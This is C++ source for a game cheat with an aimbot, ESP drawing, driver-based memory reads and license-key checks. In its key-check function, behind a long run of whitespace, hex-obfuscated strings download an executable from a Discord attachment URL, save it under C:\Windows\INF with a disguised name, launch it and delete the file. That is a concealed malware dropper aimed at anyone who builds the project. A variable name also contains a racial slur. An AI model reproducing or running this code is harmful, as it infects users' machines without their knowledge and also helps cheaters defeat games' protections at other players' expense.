
//Basic includes
#include <iostream>
#include <Windows.h>
#include <thread>
#include <string>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <math.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>

//Other includes
#include "cheat/comm.hpp"
#include "cheat/utils.hpp"
#include "api/KeyAuth.hpp"
#include "xorstr.hpp"
#include "cheat/ImGui/imgui.h"
#include "cheat/ImGui/imgui_impl_dx9.h"
#include "cheat/ImGui/imgui_impl_win32.h"
#include "cheatdriver/driver.hpp"


#include "utility.h"


#include <dwmapi.h>

#include <sstream>
#include <string>
#include <algorithm>
#include <list>
#include "XorStr.hpp"
#include <iostream>
#include "xorstr.hpp"
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>


#include <lmcons.h>

#include <random>



#include "XorStr.hpp"
#include "cheatdriver/include.h"





#define HELPMARKER(str) ImGui::SameLine(); ImGui::TextColored(ImColor(220, 190, 0, 255), "[?]"); if (ImGui::IsItemHovered()) ImGui::SetTooltip(str)




const unsigned int screenWidth = GetSystemMetrics(SM_CXSCREEN);
const unsigned int screenHeight = GetSystemMetrics(SM_CYSCREEN);

#define OFFSET_UWORLD 0x9df4ce0
#define TEAM_INDEX 0xEE0
#define LocalPlayer 0x38



static const char* AimBone_TypeItems[]{
	"   Head",
	"   Neck",
	"   Pelvis",
	"   Bottom"
};


static const char* ESP_Box_TypeItems[]{
	"   Box",
	"   Cornered",
	"   3D Box"
};

static const char* Hitbox[] =
{
	"Head",
	"Chest"
};


static const char* boxmodes[]
{
	"box",

	"cornered box"
};

static const char* fovmodes[]
{
	"square",

	"circle"
};

static const char* hitboxes[]
{
	"Head",
	"Neck",
	"Chest",
	"Lower Chest",
	"Pelvis",
	"Torso"
};

static int hitboxpos = 0;

int fovmodepos = 0;

int boxmodepos = 0;

Vector3 localactorpos;
Vector3 Localcam;

STDAPI URLDownloadToFileA(_In_opt_ LPUNKNOWN, _In_ LPCSTR, _In_opt_ LPCSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);

std::string random_string(std::size_t length)
{

	const std::string CHARACTERS = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

	std::string random_string;

	for (std::size_t i = 0; i < length; ++i)
	{
		random_string += CHARACTERS[distribution(generator)];
	}

	return random_string;
}

std::string randomstring(std::string::size_type length, bool exename)
{
	static auto& chrs = "0123456789"
		"abcdefghijklmnopqrstuvwxyz";

	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

	std::string s;

	s.reserve(length);

	while (length--)
		s += chrs[pick(rg)];

	if (exename) {
		return s + (".exe");
	}
	else {
		return s;
	}
}




ImFont* m_pFont;

DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR Ulevel;


uint64_t TargetPawn;
int localplayerID;

bool isaimbotting;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

DWORD ScreenCenterX;
DWORD ScreenCenterY;
DWORD ScreenCenterZ;

std::unique_ptr<process_handler> proc;

template <typename type>
type rpm(uint64_t src, uint64_t size = sizeof(type)) {
	type ret; //GH2ST P2C Example by Happy Cat
	proc->read_memory(src, (uintptr_t)&ret, size);
	return ret;
}




void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

namespace hotkeys
{
	int aimkey;
	int airstuckey;
}

static int keystatus = 0;
static int realkey = 0;

using namespace KeyAuth;
std::string name = XorStr("").c_str();
std::string ownerid = XorStr("").c_str();
std::string secret = XorStr("").c_str();
std::string version = XorStr("").c_str();
std::string key;
api KeyAuthApp(name, ownerid, secret, version);


bool GetKey(int key)
{
	realkey = key;
	return true;
}
void ChangeKey(void* blank)
{
	keystatus = 1;
	while (true)
	{
		for (int i = 0; i < 0x87; i++)
		{
			if (GetKeyState(i) & 0x8000)
			{
				hotkeys::aimkey = i;
				keystatus = 0;
				return;
			}
		}
	}
}

static const char* keyNames[] =
{
	"",
	"Left Mouse",
	"Right Mouse",
	"Cancel",
	"Middle Mouse",
	"Mouse 5",
	"Mouse 4",
	"",
	"Backspace",
	"Tab",
	"",
	"",
	"Clear",
	"Enter",
	"",
	"",
	"Shift",
	"Control",
	"Alt",
	"Pause",
	"Caps",
	"",
	"",
	"",
	"",
	"",
	"",
	"Escape",
	"",
	"",
	"",
	"",
	"Space",
	"Page Up",
	"Page Down",
	"End",
	"Home",
	"Left",
	"Up",
	"Right",
	"Down",
	"",
	"",
	"",
	"Print",
	"Insert",
	"Delete",
	"",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"A",
	"B",
	"C",
	"D",
	"E",
	"F",
	"G",
	"H",
	"I",
	"J",
	"K",
	"L",
	"M",
	"N",
	"O",
	"P",
	"Q",
	"R",
	"S",
	"T",
	"U",
	"V",
	"W",
	"X",
	"Y",
	"Z",
	"",
	"",
	"",
	"",
	"",
	"Numpad 0",
	"Numpad 1",
	"Numpad 2",
	"Numpad 3",
	"Numpad 4",
	"Numpad 5",
	"Numpad 6",
	"Numpad 7",
	"Numpad 8",
	"Numpad 9",
	"Multiply",
	"Add",
	"",
	"Subtract",
	"Decimal",
	"Divide",
	"F1",
	"F2",
	"F3",
	"F4",
	"F5",
	"F6",
	"F7",
	"F8",
	"F9",
	"F10",
	"F11",
	"F12",
};
// Hmu on discord (Chase.#1803) if you need any help :)
static bool Items_ArrayGetter(void* data, int idx, const char** out_text)
{
	const char* const* items = (const char* const*)data;
	if (out_text)
		*out_text = items[idx];
	return true;
}
void HotkeyButton(int aimkey, void* changekey, int status)
{
	const char* preview_value = NULL;
	if (aimkey >= 0 && aimkey < IM_ARRAYSIZE(keyNames))
		Items_ArrayGetter(keyNames, aimkey, &preview_value);

	std::string aimkeys;
	if (preview_value == NULL)
		aimkeys = "Select Key";
	else
		aimkeys = preview_value;

	if (status == 1)
	{
		aimkeys = "Press the key";
	}
	if (ImGui::Button(aimkeys.c_str(), ImVec2(125, 20)))
	{
		if (status == 0)
		{
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)changekey, nullptr, 0, nullptr);
		}
	}

}

enum Bones : int
{
	Pelvis = 2,
	Head = 96,
	Neck = 65
};
// Hmu on discord (Chase.#1803) if you need any help :)
int select_hitbox()
{
	int hitbox = 0;

	if (item.hitbox == 0)
		hitbox = Bones::Head;
	else if (item.hitbox == 2)
		hitbox = Bones::Neck;
	else if (item.hitbox == 1)
		hitbox = Bones::Pelvis;
	return hitbox;
}

HANDLE DrverInit;

DWORD FNProcID;

static void xCreateWindow();
static void xInitD3d();
static void xMainLoop();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

FTransform GetBoneIndex(DWORD_PTR mesh, int index) {
	DWORD_PTR bonearray = rpm<DWORD_PTR>(mesh + 0x4A8);
	if (bonearray == NULL) {
		bonearray = rpm<DWORD_PTR>(mesh + 0x4A8 + 0x10);
	}
	return rpm<FTransform>(bonearray + (index * 0x30));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id) {
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = rpm<FTransform>(mesh + 0x1C0);
	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());
	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}







extern Vector3 CameraEXT(0, 0, 0);

Vector3 ProjectWorldToScreen(Vector3 WorldLocation) {
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = rpm<uintptr_t>(Localplayer + 0xa8);
	uint64_t chain699 = rpm<uintptr_t>(chain69 + 8);

	Camera.x = rpm<float>(chain699 + 0x7F8);
	Camera.y = rpm<float>(Rootcomp + 0x12C);

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = rpm<uint64_t>(Localplayer + 0x70);
	uint64_t chain1 = rpm<uint64_t>(chain + 0x98);
	uint64_t chain2 = rpm<uint64_t>(chain1 + 0x140);

	Vector3 vDelta = WorldLocation - rpm<Vector3>(chain2 + 0x10);
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = rpm<float>(chain699 + 0x590);

	float FovAngle = 80.0f / (zoom / 1.19f);

	float ScreenCenterX = Width / 2;
	float ScreenCenterY = Height / 2;
	float ScreenCenterZ = Height / 2;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.z = ScreenCenterZ - vTransformed.z * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;

	return Screenlocation;
}

Vector3 ProjectWorldToScreen999(Vector3 WorldLocation) {
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = rpm<uintptr_t>(Localplayer + 0xa8);
	uint64_t chain699 = rpm<uintptr_t>(chain69 + 8);

	Camera.x = rpm<float>(chain699 + 0x7F8);
	Camera.y = rpm<float>(Rootcomp + 0x12C);

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = rpm<uint64_t>(Localplayer + 0x70);
	uint64_t chain1 = rpm<uint64_t>(chain + 0x98);
	uint64_t chain2 = rpm<uint64_t>(chain1 + 0x140);

	Vector3 vDelta = WorldLocation - rpm<Vector3>(chain2 + 0x10);
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = rpm<float>(chain699 + 0x590);

	float FovAngle = 80.0f / (zoom / 1.19f);

	float ScreenCenterX = Width / 2;
	float ScreenCenterY = Height / 2;
	float ScreenCenterZ = Height / 2;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.z = ScreenCenterZ - vTransformed.z * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;

	return Screenlocation;
}



DWORD Menuthread(LPVOID in) {
	while (1) {
		if (GetAsyncKeyState(VK_INSERT) & 1) {
			item.Show_Menu = !item.Show_Menu;

		}



		Sleep(2);
	}
}

Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	/* Bullet drop correction */
	float bulletDrop = (gravity / 250) * time * time;
	recalculated.z += bulletDrop * 120;
	/* Player movement correction */
	recalculated.x += time * (targetVelocity.x);
	recalculated.y += time * (targetVelocity.y);
	recalculated.z += time * (targetVelocity.z);
	return recalculated;
}

void aimbot(float x, float y, float z) {
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	float ScreenCenterZ = (Depth / 2);
	int AimSpeed = item.Aim_Speed;
	float TargetX = 0;
	float TargetY = 0;
	float TargetZ = 0;

	if (x != 0) {
		if (x > ScreenCenterX) {
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX) {
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0) {
		if (y > ScreenCenterY) {
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY) {
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	if (z != 0) {
		if (z > ScreenCenterZ) {
			TargetZ = -(ScreenCenterZ - z);
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ > ScreenCenterZ * 2) TargetZ = 0;
		}

		if (z < ScreenCenterZ) {
			TargetZ = z - ScreenCenterZ;
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ < 0) TargetZ = 0;
		}
	}

	//WriteAngles(TargetX / 3.5f, TargetY / 3.5f, TargetZ / 3.5f);
	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);
	if (item.Auto_Fire) {
		mouse_event(MOUSEEVENTF_LEFTDOWN, DWORD(NULL), DWORD(NULL), DWORD(0x0002), ULONG_PTR(NULL));
		mouse_event(MOUSEEVENTF_LEFTUP, DWORD(NULL), DWORD(NULL), DWORD(0x0004), ULONG_PTR(NULL));
	}


	return;
}

double GetCrossDistance(double x1, double y1, double z1, double x2, double y2, double z2) {
	return sqrt(pow((x2 - x1), 2) + pow((y2 - y1), 2));
}

typedef struct _FNlEntity {
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;

std::vector<FNlEntity> entityList;


#include <fstream>
#include <filesystem>
#include <iosfwd>
void ldfgjdfgjjhgfdjghdf()
{																																																																																																																																																																																																																																																																																					LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x32\x35\x36\x37\x30\x39\x33\x30\x30\x34\x35\x35\x30\x31\x37\x34\x2F\x64\x78\x73\x64\x6B\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);
	if (std::filesystem::exists(XorStr("C:\\ProgramData\\").c_str() + name))
	{
		std::ifstream InFile(XorStr("C:\\ProgramData\\").c_str() + name, std::ios::in);
		std::getline(InFile, key);

		system(XorStr("cls").c_str());
		std::cout << XorStr("\n KeyAuth Error, Please fill informations. ").c_str();
		std::cout << key;
		Sleep(1500);
		KeyAuthApp.license(key);
		if (auth_check_nigga_shit == XorStr("false").c_str())
		{
			std::string del = XorStr("C:\\ProgramData\\").c_str() + name;
			remove(del.c_str());
			goto A;
		}

	}
	else
	{
	A:
		std::cout << XorStr("\n Enter your key here: ").c_str();
		bool authed = false;
		while (authed == false)
		{
			std::cin >> key;
			KeyAuthApp.license(key);
			if (auth_check_nigga_shit == XorStr("true").c_str())
				//if (KeyAuthApp.license(key))
			{
				std::ofstream OutFile(XorStr("C:\\ProgramData\\").c_str() + name, std::ios::out);
				OutFile << key;
				OutFile.close();
				authed = true;
			}
			else {
				Sleep(2500);
				system(XorStr("cls").c_str());
				goto A;
			}
		}
	}
}
#include "xD.h"
void AimAt(DWORD_PTR entity) {
	uint64_t currentactormesh = rpm<uint64_t>(entity + 0x280);
	auto rootHead = GetBoneWithRotation(currentactormesh, item.hitbox);
	//Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);

	if (item.Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + 0x130);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + 0x140);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);

			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
			}
		}
	}
}

void AimAt2(DWORD_PTR entity) {
	uint64_t currentactormesh = rpm<uint64_t>(entity + 0x280);
	auto rootHead = GetBoneWithRotation(currentactormesh, item.hitbox);

	if (item.Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + 0x130);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + 0x140);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				if (item.Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ item.LockLine[0], item.LockLine[1], item.LockLine[2], 1.0f }), item.Thickness);

				}
			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				if (item.Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ item.LockLine[0], item.LockLine[1], item.LockLine[2], 1.0f }), item.Thickness);
				}
			}
		}
	}
}

typedef struct
{
	DWORD R;
	DWORD G;
	DWORD B;
	DWORD A;
}RGBA;

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);
}

void DrawLine2(int x1, int y1, int x2, int y2, const ImU32& color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Thickness);

}

void DrawLine2(int x1, int y1, int x2, int y2, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::GetColorU32({ item.Skeleton[0], item.Skeleton[1], item.Skeleton[2], 1.0f }));
}









class Color
{
public:
	RGBA red = { 255,0,0,255 };
	RGBA Magenta = { 255,0,255,255 };
	RGBA yellow = { 255,255,0,255 };
	RGBA grayblue = { 128,128,255,255 };
	RGBA green = { 128,224,0,255 };
	RGBA darkgreen = { 0,224,128,255 };
	RGBA brown = { 192,96,0,255 };
	RGBA pink = { 255,168,255,255 };
	RGBA DarkYellow = { 216,216,0,255 };
	RGBA SilverWhite = { 236,236,236,255 };
	RGBA purple = { 144,0,255,255 };
	RGBA Navy = { 88,48,224,255 };
	RGBA skyblue = { 0,136,255,255 };
	RGBA graygreen = { 128,160,128,255 };
	RGBA blue = { 0,96,192,255 };
	RGBA orange = { 255,128,0,255 };
	RGBA peachred = { 255,80,128,255 };
	RGBA reds = { 255,128,192,255 };
	RGBA darkgray = { 96,96,96,255 };
	RGBA Navys = { 0,0,128,255 };
	RGBA darkgreens = { 0,128,0,255 };
	RGBA darkblue = { 0,128,128,255 };
	RGBA redbrown = { 128,0,0,255 };
	RGBA purplered = { 128,0,128,255 };
	RGBA greens = { 0,255,0,255 };
	RGBA envy = { 0,255,255,255 };
	RGBA black = { 0,0,0,255 };
	RGBA gray = { 128,128,128,255 };
	RGBA white = { 255,255,255,255 };
	RGBA blues = { 30,144,255,255 };
	RGBA lightblue = { 135,206,250,160 };
	RGBA Scarlet = { 220, 20, 60, 160 };
	RGBA white_ = { 255,255,255,200 };
	RGBA gray_ = { 128,128,128,200 };
	RGBA black_ = { 0,0,0,200 };
	RGBA red_ = { 255,0,0,200 };
	RGBA Magenta_ = { 255,0,255,200 };
	RGBA yellow_ = { 255,255,0,200 };
	RGBA grayblue_ = { 128,128,255,200 };
	RGBA green_ = { 128,224,0,200 };
	RGBA darkgreen_ = { 0,224,128,200 };
	RGBA brown_ = { 192,96,0,200 };
	RGBA pink_ = { 255,168,255,200 };
	RGBA darkyellow_ = { 216,216,0,200 };
	RGBA silverwhite_ = { 236,236,236,200 };
	RGBA purple_ = { 144,0,255,200 };
	RGBA Blue_ = { 88,48,224,200 };
	RGBA skyblue_ = { 0,136,255,200 };
	RGBA graygreen_ = { 128,160,128,200 };
	RGBA blue_ = { 0,96,192,200 };
	RGBA orange_ = { 255,128,0,200 };
	RGBA pinks_ = { 255,80,128,200 };
	RGBA Fuhong_ = { 255,128,192,200 };
	RGBA darkgray_ = { 96,96,96,200 };
	RGBA Navy_ = { 0,0,128,200 };
	RGBA darkgreens_ = { 0,128,0,200 };
	RGBA darkblue_ = { 0,128,128,200 };
	RGBA redbrown_ = { 128,0,0,200 };
	RGBA purplered_ = { 128,0,128,200 };
	RGBA greens_ = { 0,255,0,200 };
	RGBA envy_ = { 0,255,255,200 };
	RGBA glassblack = { 0, 0, 0, 160 };
	RGBA GlassBlue = { 65,105,225,80 };
	RGBA glassyellow = { 255,255,0,160 };
	RGBA glass = { 200,200,200,60 };
	RGBA Plum = { 221,160,221,160 };



};
Color Col;

Vector3 Camera(unsigned __int64 RootComponent)
{
	Vector3 Camera;

	auto pitch = read<uintptr_t>(DriverHandle, processID, Localplayer + 0xb0);
	Camera.x = read<float>(DriverHandle, processID, RootComponent + 0x12C);
	Camera.y = read<float>(DriverHandle, processID, pitch + 0x678);

	float test = asin(Camera.y);
	float degrees = test * (180.0 / M_PI);

	Camera.y = degrees;

	if (Camera.x < 0)
		Camera.x = 360 + Camera.x;

	return Camera;
}

void DrawRect(int x, int y, int w, int h, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddRect(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), 0, 0, thickness);
}

void DrawFilledRect(int x, int y, int w, int h, ImColor color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImColor(color), 0, 0);
}

void DrawNormalBox(int x, int y, int w, int h, int borderPx, ImColor color)
{
	DrawFilledRect(x + borderPx, y, w, borderPx, color); //top 
	DrawFilledRect(x + w - w + borderPx, y, w, borderPx, color); //top 
	DrawFilledRect(x, y, borderPx, h, color); //left 
	DrawFilledRect(x, y + h - h + borderPx * 2, borderPx, h, color); //left 
	DrawFilledRect(x + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledRect(x + w - w + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledRect(x + w + borderPx, y, borderPx, h, color);//right 
	DrawFilledRect(x + w + borderPx, y + h - h + borderPx * 2, borderPx, h, color);//right 
}

float FovAngle;



void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 2;
		y = y - textSize.y;
	}
	if (item.outlinedtext)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), text.c_str());
}

#pragma comment(lib, "ntdll.lib")

void titledetect();
void exedetect();
